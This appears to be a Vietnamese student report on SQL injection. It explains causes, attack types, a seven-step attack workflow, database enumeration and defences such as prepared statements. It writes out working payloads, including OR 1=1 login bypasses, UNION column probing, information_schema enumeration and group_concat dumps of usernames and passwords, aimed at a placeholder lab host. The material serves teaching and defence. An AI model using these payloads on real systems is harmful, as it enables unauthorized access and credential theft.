# BÁO CÁO SQL INJECTION - LÝ THUYẾT CƠ BẢN

---

## MỤC LỤC

1. Giới thiệu
2. Nguyên nhân
3. Phân loại SQL Injection
4. 4 Kiểu tấn công cơ bản
5. Quy trình tấn công tổng quát
6. Enumeration Database
7. Cách phòng chống
8. Tổng kết
9. Tài liệu tham khảo

---

## 1. GIỚI THIỆU

### 1.1 SQL Injection là gì?

SQL Injection (SQLi) là kỹ thuật tấn công cho phép kẻ tấn công chèn các câu lệnh SQL độc hại vào các trường nhập liệu của ứng dụng web. Mục tiêu là thao tác với cơ sở dữ liệu phía sau để đọc, sửa đổi hoặc xóa dữ liệu trái phép.

### 1.2 Tại sao SQL Injection nguy hiểm?

1. Đọc toàn bộ dữ liệu trong database (tài khoản, mật khẩu, thông tin cá nhân)
2. Sửa đổi hoặc xóa dữ liệu quan trọng
3. Vượt qua xác thực đăng nhập mà không cần mật khẩu
4. Leo thang đặc quyền từ user thường lên admin
5. Trường hợp nghiêm trọng: thực thi mã độc trên server (RCE)

---

## 2. NGUYÊN NHÂN

### 2.1 Nguyên nhân gốc rễ

1. Ghép chuỗi trực tiếp: Nối input của người dùng vào câu lệnh SQL
2. Không kiểm tra dữ liệu đầu vào: Thiếu validation và sanitization
3. Không sử dụng Prepared Statements: Không tách biệt code và dữ liệu
4. Hiển thị lỗi database: Bật chế độ hiển thị lỗi chi tiết
5. Cấp quyền quá cao: Ứng dụng dùng tài khoản có quyền cao

### 2.2 Cơ chế hoạt động

Câu lệnh SQL gốc:
SELECT * FROM users WHERE username = 'input' AND password = 'input'

Kẻ tấn công nhập vào ô username:
admin' OR 1=1-- -

Câu lệnh SQL trở thành:
SELECT * FROM users WHERE username = 'admin' OR 1=1-- -' AND password = ''

Vì 1=1 luôn đúng, câu lệnh trả về TẤT CẢ users. Kẻ tấn công đăng nhập thành công.

---

## 3. PHÂN LOẠI SQL INJECTION

### 3.1 Phân loại theo cách khai thác

1. In-band (Classic): Kết quả hiển thị trực tiếp
   - UNION-based
   - Error-based

2. Blind (Inferential): Không thấy kết quả trực tiếp, phải suy luận
   - Boolean-based
   - Time-based

3. Out-of-band: Sử dụng kênh khác để nhận kết quả
   - DNS exfiltration
   - HTTP

### 3.2 Phân loại theo vị trí tấn công

1. GET Parameter: ?id=1' OR 1=1-- -
2. POST Parameter: Form đăng nhập, tìm kiếm
3. Cookie: Session cookie bị lợi dụng
4. HTTP Header: User-Agent, Referer

### 3.3 Phân loại theo loại câu lệnh

1. SELECT: Đọc dữ liệu, bypass login (mức độ: Trung bình)
2. UPDATE: Sửa đổi dữ liệu, đổi mật khẩu (mức độ: Cao)
3. INSERT: Thêm dữ liệu mới (mức độ: Trung bình)
4. DELETE: Xóa dữ liệu (mức độ: Rất cao)

---

## 4. 4 KIỂU TẤN CÔNG CƠ BẢN

### 4.1 Non-String (Số nguyên)

Đặc điểm:
- Tham số là số nguyên
- SQL viết: profileID=10 (KHÔNG có dấu nháy)
- Dữ liệu không được bao quanh bởi dấu nháy

Cách nhận biết:
- Nhìn vào URL: ?id=10 (không có dấu nháy)
- Nhìn vào source code

Payload:
1 OR 1=1-- -

Cơ chế: Tạo điều kiện 1=1 luôn đúng, làm toàn bộ câu lệnh SQL trả về TRUE.

---

### 4.2 String (Chuỗi)

Đặc điểm:
- Tham số là chuỗi ký tự
- SQL viết: profileID='10' (CÓ dấu nháy)
- Dữ liệu được bao quanh bởi dấu nháy đơn

Cách nhận biết:
- Nhìn vào URL: ?id='10' (có dấu nháy)
- Nhìn vào source code

Payload:
1' OR '1'='1'-- -

Cơ chế:
- Dấu ' đầu tiên để đóng dấu nháy của chuỗi
- '1'='1' tạo điều kiện luôn đúng
- -- - để chú thích phần còn lại của câu lệnh

---

### 4.3 URL Injection (GET)

Đặc điểm:
- Sử dụng phương thức GET
- Dữ liệu được gửi trên URL
- Có thể có JavaScript kiểm tra phía client

Hạn chế:
- JavaScript không cho nhập ký tự đặc biệt vào form
- Không thể nhập payload trực tiếp qua form

Cách tấn công:
- Bỏ qua form hoàn toàn
- Sửa trực tiếp URL trên thanh địa chỉ
- Trình duyệt tự động mã hóa URL

Ví dụ:

URL gốc:
http://IP:5000/login?profileID=10&password=abc

URL tấn công:
http://IP:5000/login?profileID=-1' OR 1=1-- -&password=a

URL đã mã hóa:
http://IP:5000/login?profileID=-1%27%20or%201=1--%20-&password=a

---

### 4.4 POST Injection

Đặc điểm:
- Sử dụng phương thức POST
- Dữ liệu nằm trong body của request
- Không hiển thị trên URL

Hạn chế:
- Có JavaScript kiểm tra phía client
- Không thể sửa trực tiếp trên URL

Cách tấn công:
1. Sử dụng công cụ proxy như Burp Suite
2. Bắt request khi gửi form
3. Sửa dữ liệu trong body request
4. Gửi request đã sửa đi

Ví dụ:

POST /login HTTP/1.1
Host: IP:5000
Content-Type: application/x-www-form-urlencoded

profileID=1' OR '1'='1'-- -&password=a

---

## 5. QUY TRÌNH TẤN CÔNG 

### 5.1 Sơ đồ 7 bước

1. XÁC ĐỊNH MỤC TIÊU -> Tìm website/ứng dụng có tham số trên URL
2. DÒ TÌM LỖ HỔNG -> Thử payload ' OR 1=1-- -
3. XÁC ĐỊNH DATABASE -> Thử @@version, sqlite_version(), version()
4. XÁC ĐỊNH SỐ CỘT -> Dùng ORDER BY hoặc UNION SELECT NULL
5. LIỆT KÊ BẢNG/CỘT -> information_schema.tables / sqlite_master
6. DUMP DỮ LIỆU -> Lấy password, email, thông tin nhạy cảm
7. KHAI THÁC NÂNG CAO -> Đổi mật khẩu, leo thang quyền, tạo backdoor

### 5.2 Chi tiết từng bước

#### Bước 1: Xác định mục tiêu

- Tìm website/ứng dụng có tham số trên URL (?id=1, ?page=)
- Xác định các form nhập liệu (đăng nhập, tìm kiếm, ...)
- Xem source code (F12) để tìm tên cột tiềm năng

#### Bước 2: Dò tìm lỗ hổng

Mục tiêu: Xác định ứng dụng có bị SQL Injection không
Cách làm: Thử payload đơn giản nhất vào các trường nhập liệu
Payload: ' OR 1=1-- -
Kết quả mong đợi: Nếu đăng nhập thành công hoặc xuất hiện lỗi -> Có lỗ hổng

#### Bước 3: Xác định Database

Mục tiêu: Biết đang dùng database gì để dùng đúng cú pháp
Cách làm: Thử các query đặc trưng

- MySQL: SELECT @@version
- SQLite: SELECT sqlite_version()
- PostgreSQL: SELECT version()
- MSSQL: SELECT @@version

#### Bước 4: Xác định số cột

Mục tiêu: Biết bao nhiêu cột để dùng UNION
Cách làm: Dùng ORDER BY hoặc UNION SELECT NULL

Với ORDER BY:
- ' ORDER BY 1-- - -> OK
- ' ORDER BY 2-- - -> OK
- ' ORDER BY 3-- - -> LỖI -> có 2 cột

Với UNION SELECT NULL:
- ' UNION SELECT NULL-- - -> OK (1 cột)
- ' UNION SELECT NULL, NULL-- - -> OK (2 cột)
- ' UNION SELECT NULL, NULL, NULL-- - -> LỖI (3 cột không có)

#### Bước 5: Liệt kê bảng và cột

Mục tiêu: Tìm cấu trúc database
Cách làm: Truy vấn bảng hệ thống

Liệt kê bảng:
- MySQL/PostgreSQL/MSSQL: SELECT table_name FROM information_schema.tables
- SQLite: SELECT tbl_name FROM sqlite_master WHERE type='table'

Liệt kê cột:
- MySQL/PostgreSQL/MSSQL: SELECT column_name FROM information_schema.columns WHERE table_name='users'
- SQLite: SELECT sql FROM sqlite_master WHERE type='table' AND name='users'

#### Bước 6: Dump dữ liệu

Mục tiêu: Lấy dữ liệu nhạy cảm từ bảng
Cách làm: Dùng SELECT kết hợp với group_concat()

- Lấy 1 cột: SELECT password FROM users
- Lấy nhiều cột cùng lúc: SELECT group_concat(username || ':' || password) FROM users

#### Bước 7: Khai thác nâng cao

- Xác định hash (MD5, SHA1, SHA256) bằng hash-identifier
- Nếu có lỗ hổng UPDATE: Đổi mật khẩu admin mà không cần biết pass cũ
- Leo thang quyền: Từ user thường lên admin
- Tạo backdoor: Duy trì truy cập lâu dài

---

## 6. ENUMERATION DATABASE

### 6.1 Xác định Database

- MySQL: Query @@version hoặc VERSION()
- SQLite: Query sqlite_version()
- PostgreSQL: Query version()
- MSSQL: Query @@version
- Oracle: Query SELECT banner FROM v$version

### 6.2 Liệt kê thông tin

Các bảng chứa metadata:
- MySQL: information_schema
- PostgreSQL: information_schema
- MSSQL: information_schema
- SQLite: sqlite_master

Các thông tin cần lấy (MySQL):
- Danh sách database: SELECT schema_name FROM information_schema.schemata
- Danh sách bảng: SELECT table_name FROM information_schema.tables
- Danh sách cột: SELECT column_name FROM information_schema.columns WHERE table_name='users'

### 6.3 Dump dữ liệu

Các hàm quan trọng:
- group_concat(): Kết hợp nhiều dòng thành 1 chuỗi (SQLite/MySQL)
- STRING_AGG(): Kết hợp nhiều dòng thành 1 chuỗi (MSSQL)
- || : Nối chuỗi
- CONCAT(): Nối chuỗi (MySQL)

---

## 7. CÁCH PHÒNG CHỐNG

### 7.1 Prepared Statements (Quan trọng nhất)

Nguyên tắc: Tách biệt câu lệnh SQL và dữ liệu

Ưu điểm:
- Database tự động phân biệt đâu là code, đâu là dữ liệu
- Không thể inject vì input luôn được coi là dữ liệu
- Bảo vệ hoàn toàn khỏi SQL Injection

### 7.2 Input Validation

1. White-list validation: Chỉ cho phép các giá trị hợp lệ
2. Type checking: Kiểm tra kiểu dữ liệu (số, chuỗi, email)
3. Length checking: Giới hạn độ dài input

### 7.3 Least Privilege

Nguyên tắc: Cấp quyền tối thiểu cần thiết

- Tạo user riêng cho ứng dụng
- Chỉ cấp quyền SELECT, INSERT, UPDATE
- Không cấp quyền DROP, DELETE, ALTER
- Không dùng tài khoản root/admin

### 7.4 Các biện pháp khác

1. Ẩn lỗi database: Không hiển thị chi tiết lỗi ra ngoài
2. WAF: Sử dụng Web Application Firewall
3. Monitoring: Theo dõi và ghi log các truy vấn
4. Security Testing: Quét lỗ hổng và pentest định kỳ

---

## 8. TỔNG KẾT

### 8.1 Tóm tắt các kiểu tấn công

- Non-String: Number, GET/POST, 1 OR 1=1-- -
- String: String, GET/POST, 1' OR '1'='1'-- -
- URL: String, GET, -1' OR 1=1-- - (trên URL)
- POST: String, POST, 1' OR '1'='1'-- - (dùng Burp)

### 8.2 Tóm tắt quy trình 7 bước

1. Xác định mục tiêu -> Tìm điểm tấn công
2. Dò lỗ hổng -> Xác nhận SQL Injection
3. Xác định database -> Biết loại database
4. Xác định số cột -> Chuẩn bị UNION
5. Liệt kê bảng/cột -> Tìm dữ liệu nhạy cảm
6. Dump dữ liệu -> Lấy password/thông tin
7. Khai thác nâng cao -> Leo thang quyền, tạo backdoor

### 8.3 Bài học rút ra

SQL Injection là một trong những lỗ hổng bảo mật nguy hiểm nhất. Nguyên nhân chính là việc ghép chuỗi input của người dùng trực tiếp vào câu lệnh SQL. Cách phòng chống đơn giản và hiệu quả nhất là sử dụng Prepared Statements.

Lưu ý quan trọng:
1. Client-side validation (JavaScript) KHÔNG phải là bảo mật
2. Có thể đổi mật khẩu mà không cần biết mật khẩu cũ
3. Hash KHÔNG thể decrypt, chỉ có thể brute force hoặc tạo hash mới

---

## 9. TÀI LIỆU THAM KHẢO

1. OWASP SQL Injection - https://owasp.org/www-community/attacks/SQL_Injection
2. OWASP Cheat Sheet Series - https://cheatsheetseries.owasp.org/
3. PortSwigger Web Security Academy - https://portswigger.net/web-security
4. TryHackMe - SQL Injection Rooms
5. PayloadsAllTheThings - https://github.com/swisskyrepo/PayloadsAllTheThings

---
